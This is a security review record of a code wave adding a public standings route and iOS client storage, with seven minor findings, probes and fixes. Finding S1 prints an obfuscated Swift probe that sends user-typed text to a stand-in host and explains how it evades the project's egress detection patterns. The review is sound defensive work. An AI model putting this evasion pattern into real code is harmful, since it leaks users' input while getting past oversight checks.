---
record_type: review
id: m17-wave-4-security
status: ratified
seat: independent
process_version: v6.6
date: 2026-09-25
---

# M17-W4 security review: board standings to the phone, and the combination on it (#50, D-167)

**Independent:** yes. I wrote none of the code under review. I changed no repository file except
this one, and I made no git state change. Every probe mutation was restored byte for byte and
checked with sha256. Probe databases and scripts live in the session scratchpad, outside the
worktree. I used no network. No probe called `build()`, and `RUN_CONTRACT_TESTS` was not set.

## Scope

Range `7d7a9ac..939aeb5` on `wave/m17-w4`, which is 9 commits. Risk tier HIGH
(`docs/plans/m17-wave-4-plan.md:13`). This is the `/close-wave` step 5 slice pass. The release
review (Stage 5.1) still runs.

- The server: `GET /v1/boards` (`src/app/adapter/main.py:1385-1406`), `src/app/workflows/standings.py`,
  and the boot bound (`main.py:220`, `:501-535`, `:601`).
- The phone: `EngineClient.boards()` and the `get`/`fetch` split (`ios/ModelRanking/Engine/EngineClient.swift:156`, `:200-271`),
  `StandingsStore.swift`, `Combine.swift`, the new `Models.swift` structs (`:309-389`), and a
  one-word rename in `ContentView.swift:785-787`.
- The controls: `scripts/client_decl_gate.py:109-131`, `:288-294`, and `tests/unit/test_router_hints.py:358-365`
  (`EGRESS_EXACT`). Also `tests/unit/test_ios_client_contract.py:172-198` and `:252-256`, and
  `tests/unit/test_api_v1.py:539-541`.

## Verdict

**PASS-WITH-MINORS.** Nothing in this wave can be exploited in its current scope. W4 ships no
screen, and no production code calls `StandingsStore`, `combine` or `boards()`. I grepped
`ios/ModelRanking`: the only references are the definitions.

The server route is clean. It serves positions and public metadata only, its errors are generic,
it reads the database read-only, and it ignores the query string.

Two of the minors, S1 and S2, should be fixed before W5 gives these types a caller. Both are
cheap:
- S1: a store that refuses any URL that is not a file URL.
- S2: the 4 MiB cap moved into `FetchedStandings`.

The gate gap under S1 is older than this wave. It should be filed as an issue (`/file-issue`).

## Findings

**S1: MINOR. The new store takes any URL, and `Data(contentsOf:)` fetches remote ones. A three-line
view mutant sends the typed text to any host, and both D-126 gates pass it.**
Exploitable in the current scope: **no.** It needs a code change, and nothing calls the store. The
underlying gap is older than this wave: the same mutant works through `GapRegisterStore`.

- Evidence:
  - `ios/ModelRanking/Engine/StandingsStore.swift:34`: `public init(url: URL)`. It checks nothing.
  - `StandingsStore.swift:52`: `Data(contentsOf: url)`. On an `https://` URL this is a network GET.
  - `client_decl_gate.py` files `Data.init(contentsOf` under FILESYSTEM, which is allowed in this
    file, not under NETWORK.
- Probe: I inserted this after `gaps.record(typed)` in `ContentView.swift`:

  ```swift
  if let target = try? JSONDecoder().decode([URL].self, from: Data("[\"htt\u{70}s://example.invalid/\(typed)\"]".utf8)).first {
      _ = StandingsStore(url: target).load()
  }
  ```

  Results:
  - `test_router_hints.py` and `test_ios_client_contract.py`: **28 passed**.
  - `make client-decls`: **PASS**, 13 files in 4 configurations, all type-checked.

  Why both gates miss it:
  - `[URL].self` escapes the text gate's `\bURL\s*\.` pattern.
  - The escaped `p` escapes the `https?://` pattern.
  - The declaration gate sees only `Foundation.URL`, because the URL is built by `Decodable`, not
    by `URL.init(string:)`. That gate's own model says a URL made from a string is how the network
    starts (`client_decl_gate.py:95-97`).
  - The Engine target does not compile `ContentView.swift`, so `swift test` cannot see it either.
- Control: the same line with `GapRegisterStore(url: target).load()` also passes both gates
  (`FrontDoor.swift:286`, `:306`). So the wave did not create this gap. It adds a second sink of
  the same shape.
- The in-file variant is the same class (B31, "what a file does with a capability it owns"). A
  mutant inside `StandingsStore.swift` can shadow `url` with `self.url.appendingPathComponent(x)`
  and keep the exact expression `Data(contentsOf: url)` intact.
- Fix, in this wave or before W5: the store refuses anything that is not a file URL. Two ways:
  - a failable `init?(url:)` with `guard url.isFileURL`;
  - or a `guard url.isFileURL` in `load()` and `save()`.

  Do not use `precondition`: the declaration gate forbids it. Pin the check with a test that
  passes an `https://` URL.
- Fix, as a filed issue: the gates should treat `URL` used as a `Decodable` type (`URL.self`,
  `[URL].self`, `URL?.self`) as a way to build an address. `GapRegisterStore` should get the same
  file-URL guard.

**S2: MINOR. The 4 MiB cap is only in `EngineClient.boards()`, not in what the store saves or
loads. The store's rule that it keeps "exactly what the engine sent, nothing typed" is a
convention, not something any type or gate enforces.**
Exploitable in the current scope: **no.** The file is in the app sandbox, the only producer today
is `boards()`, and nothing calls the store.

- Evidence:
  - The cap: `EngineClient.swift:202`.
  - `FetchedStandings.init(payload:)` (`Models.swift:385`) accepts any size and any extra JSON
    keys. `JSONDecoder` ignores unknown keys.
  - `StandingsStore.current(now:fetch:)` (`:76`) takes any `fetch` closure.
  - `save` (`:63`) and `load` (`:51-59`) check no size.
- Probe: a temporary method in `StandingsStoreTests`. `swift test --filter StandingsStoreTests`:
  8 run, 0 failures, so every assertion held.
  - An 8 MiB payload from a closure that is not the network was served, saved and loaded back.
  - A payload with an extra `"typed": "a secret question"` key was stored and read back
    unchanged.
- On load, a hostile or corrupt file cannot crash the app: every step is `try?`, and an
  undecodable file is `nil` (`testAnUnreadableFileIsNothingStoredNotACrash`). But its size is not
  bounded. `Data(contentsOf:)` reads the whole file.
- Fix: check `payload.count <= EngineClient.maxStandingsBytes` inside `FetchedStandings.init`,
  before decoding, so every producer is held to the cap. `load()` then inherits it. Optionally,
  read the file size before `Data(contentsOf:)`.

**S3: MINOR. The phone's cap is applied after the whole body is in memory. It limits what is
decoded, not what is downloaded.**
Exploitable in the current scope: **no.** Only the configured engine host could send an oversized
body. ATS keeps a network attacker out on a non-local host.

- Evidence: `EngineClient.swift:234-236` buffers the full body with `session.data(from:)`. The
  size check runs afterwards, at `:202`. Only `timeoutIntervalForResource = 10` (`:165`) bounds
  the download.
- Every other route has no cap at all, which is older than this wave.
- The plan says "refuses a response larger than a fixed byte ceiling before decoding it". That is
  what the code does. The finding is that "before downloading" is not true.
- Fix, optional: use `session.bytes(from:)` with a running count, or refuse early when
  `expectedContentLength` is above the cap.

**S4: MINOR. The new position-arithmetic check matches on names and misses common forms. It is not
a security exposure, and the score checks are unchanged.**
Exploitable in the current scope: **no.** Positions are public, and the route carries no score.

- Probe: I appended both of these to `Detail.swift`, a file with no permission:
  - `s.reduce(0) { $0 + $1.position }`
  - `total += x.position`

  `pytest -k arithmetic`: **3 passed**.
- Why it misses them:
  - The regex at `test_ios_client_contract.py:181-183` needs the bare word right next to the
    operator.
  - `position` is not in `SERVED_NUMBERS` (`:126`), so the property-access check does not cover
    it.
- `ContentView.swift:785-787` renames the local `position` to `place` so `place - 1` does not trip
  the new check. That arithmetic is on a list index the client worked out (`rankOf`), not on a
  served position, so the rename is harmless. It does show that the check matches on names.
- The score checks were not widened:
  - `SCORE_ARITHMETIC_PERMITTED` (`:169`) and both score regexes (`:156-158`, `:213`) are
    unchanged.
  - `Combine.swift` touches no `score` and no `blendedPerM`.
  - `SORTING_PERMITTED` gained exactly one key, `("Combine.swift", "common")`.
- The `+=` blind spot also exists in the score checks. That is older than this wave.
- Fix: add `"position"` to `SERVED_NUMBERS`, and allow `[-+*/]=` before `\w+\.field`.

**S5: MINOR (hygiene). `/v1/boards` is the heaviest anonymous response: uncompressed, uncached,
and rebuilt on every request.**
Exploitable in the current scope: **only as bandwidth cost.** It is bounded by the thread limiter
(`MAX_CONCURRENT_REQUESTS`, 8) and by the boot bound.

- Measured on a synthetic artifact built from `_seeded_db`, plus 61 attributed sources, 300 models
  and 3 rows each:

  | Response | Positions | Size | Median time per request |
  |---|---:|---:|---:|
  | `/v1/boards` | 6,960 | 258,711 B | 64 ms |
  | `/v1/boards` | 23,979 (near the 25,000 ceiling) | 889,825 B | 201 ms |
  | `/v1/recommendations` | – | 7,877 B | 121 ms |

- Each request costs less CPU than `/v1/recommendations` but returns about 33 times the bytes.
- The research note measured about 32 KB gzipped
  (`docs/research/m17-w4-standings-payload-2026-09-25.md:26`).
- The payload holds no secret, so compressing it carries no BREACH-style risk.
- Fix, optional:
  - add `GZipMiddleware`;
  - or memoise the payload per artifact identity (the `_database_unusable` pattern) and add an
    `ETag`.

**S6: NIT. The new egress bound is checked only at boot.**
Exploitable in the current scope: **no.** The artifact is built by the operator, and an attacker
cannot grow it.

- Evidence: `_egress_problems` runs from `validate_startup_config` (`main.py:601`) only. The
  nightly refresh (D-154) replaces the artifact while the process runs, and `refresh.py` has no
  standings ceiling. Its growth guards cover surfaces only (`MAX_SURFACE_GAIN`, `:143`).
- This is the same shape as the older `MAX_PUBLISHED_RANKING_ROWS`. The phone's 4 MiB cap is the
  backstop.

**S7: NIT. `combine` has two properties that matter only if the engine sends a bad payload.**
Exploitable in the current scope: **no.** The engine's `GROUP BY` makes (board, model) unique, and
the boot bound limits the size.

- It is O(n²) per chosen board: `shared.filter` runs inside a loop over `shared`
  (`Combine.swift:66`).
- A model listed twice on one board would be counted twice (`:67-70`).

## Checked and clean

- **What the route serves.** Keys come from a probe on the seeded database, and
  `test_the_payload_carries_no_score_at_all` pins that there is no score.
  - Per board: `id`, `benchmark`, `metric`, `evidence_date`, `observed_at` (date only), `attribution`,
    and `standings[]` of `{model, position}`.
  - Per model: `id`, `display`, `vendor`, `blended_per_m`, `accessibility`.
  - `scores.source_url` is never selected (`standings.py:34-40`).
  - The only URL in the body is Epoch's required CC-BY attribution sentence, which the other routes
    already serve.
  - No filesystem paths, and no internal row ids.
- **Error bodies.** Probes on each failure:
  - a missing file, a corrupt file, a directory, and an artifact with no `px_median`: 503
    `evidence_unavailable`, generic;
  - an unattributed source (`ValueError`): 500 `internal_error` through `_unhandled`, with the
    `nosniff` header. The source name, including one I seeded that looked like a path, did not
    appear in the body.
- **INV-23 (read-only).** The route opens the database only through `open_readonly`, which becomes
  `schema.open_readonly`, a derived `?mode=ro` URI. The database's sha256 was unchanged after the
  reads, and no `-journal` or `-wal` file appeared.
- **The query string is ignored.** Three probes returned byte-identical bodies:
  `?task=coding&x=1`, a 5,000-character query, and `?boards=arena`. POST, PUT, DELETE and HEAD
  return 405.
- **`DECLARED_ROUTES` exact set.** A probe added an undeclared `/v1/boards/raw` route, and
  `test_the_shipped_surface_is_exactly_the_declared_surface` failed as it should. The main.py
  sha256 was restored.
- **Boot bound.** `standings_row_count` counts the same `_BEST` set the payload publishes. The SQL
  is built only from constants, and `ruff --select S` is clean on both changed modules.
- **`EngineClient.boards()`.**
  - It takes no arguments, so nothing from the question can reach it.
  - `testTheBoardsRequestCarriesNothing` pins the path and that there is no query.
  - Splitting `get` into `fetch` kept the `SameHostOnly` delegate (`:235`), the status check and
    the refusal mapping.
  - The session is ephemeral, and the cache policy ignores local data.
- **File-system permission scope.**
  - `FILESYSTEM_FILES` adds exactly `StandingsStore.swift` (`client_decl_gate.py:123-126`).
  - Path building is extended to that same file.
  - `FORBIDDEN` is unchanged.
  - `EGRESS_EXACT` adds seven exact expressions, each required exactly once. A second
    `FileManager`, `write(` or `contentsOf:` in the file is still refused.
  - `make client-decls`: PASS.
- **Where and how the file is stored.** In Caches, with the temporary folder as a fallback. Both
  are excluded from backup by the system. The default file-protection class applies. For a public
  payload that any phone can fetch again, this is acceptable. If S2 were ever used to store typed
  text here, it would be less protected than the gap register (`.completeFileProtection`), which
  is one more reason to close S2.
- **Secrets and dependencies.** `gitleaks detect --no-git`: no leaks. No new dependency, and no
  change to `pyproject.toml`. The only new import is `pytest`, in a test.
- **Sensitive files.** None touched: no CI, manifests, plist, `pbxproj` or `.claude/settings.json`.
- **Tests on HEAD.**
  - The five Python suites in scope: 74 passed.
  - `swift test` on `BoardsRequestTests`, `CombineTests` and `StandingsStoreTests`: 21 passed.

## Gates

- [x] Secret scan: gitleaks, no leaks.
- [x] No new dependency, so `deps` and `slopsquat` are unaffected.
- [x] Default-deny on the new surface. It is read-only, takes no parameters, and the exact-set
  route control fires on anything undeclared.
- [x] Permission matrix not violated. The two widened permissions are named in D-167 clause 4 and
  scoped to one file each.
- [x] SAST: ruff `S` rules clean on `standings.py` and `main.py`. Bandit is not installed in the
  venv.
- [ ] Auth, PII and payment: not applicable. The route is public, read-only data.

## Note on the run

Another seat was working in this worktree at the same time: it touched the mtime of
`Combine.swift` and wrote `docs/reviews/m17-wave-4-review.md`. That broke one `client-decls` run
("modified during the build"), and the rerun passed. `git status` showed only my own mutation
during each probe, and a clean tree after each restore, apart from that other seat's untracked
review file.
